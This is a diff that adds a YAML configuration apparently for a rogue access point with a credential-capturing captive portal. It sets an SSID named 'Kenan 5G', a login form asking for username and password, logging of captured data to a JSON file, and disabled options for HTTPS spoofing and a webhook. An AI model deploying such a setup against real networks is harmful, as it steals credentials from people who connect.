@@ -1,0 +1,29 @@
+advanced_settings:
+    auto_shutdown: false
+    enable_https_spoofing_attempts: false
+    plugin_paths: []
+ap_settings:
+    channel: 6
+    interface: wlan0
+    ssid: Kenan 5G
+logging_settings:
+    enable_data_logging: true
+    log_file: logs/captured_data.json
+    log_format: json
+network_settings:
+    internet_interface: wlan1
+    local_ip: 10.0.0.1
+    subnet_mask: 255.255.255.0
+portal_settings:
+    login_form_fields:
+    -   label: Username
+        name: username
+        type: text
+    -   label: Password
+        name: password
+        type: password
+    port: 80
+    redirect_url_after_login: /success
+webhook_settings:
+    enable_webhook: false
+    webhook_url: ''
